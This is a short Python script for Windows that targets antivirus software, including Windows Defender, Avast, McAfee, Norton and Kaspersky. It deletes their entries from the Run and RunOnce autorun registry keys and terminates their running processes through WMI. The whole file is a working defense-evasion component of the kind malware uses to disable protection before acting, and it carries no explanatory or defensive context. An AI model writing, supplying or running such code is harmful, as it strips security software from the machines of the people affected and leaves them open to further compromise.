import winreg, wmi, os, signal

targets = ["Windows Defender", "Avast", "McAfee", "Norton", "Kaspersky"]

hives = [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER] 
paths = ["SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"]

for hive in hives:
    for path in paths:
        reg = winreg.ConnectRegistry(None, hive)
        key = winreg.OpenKey(reg, path, 0, winreg.KEY_READ)
        try:
            index = 0
            while True:
                value = winreg.EnumValue(key, index)
                for target in targets:
                    if target in value[1]:
                        print("Removing %s from Autorun" % value[0])
                        key2 = winreg.OpenKey(reg, path, 0, winreg.KEY_SET_VALUE)
                        winreg.DeleteValue(key2, value[0])
                index += 1
        except OSError:
            pass

processes = wmi.WMI()
for p in processes.Win32_Process():
    for target in targets:
        if target in p.Name:
            os.kill(int(p.ProcessId), signal.SIGTERM)
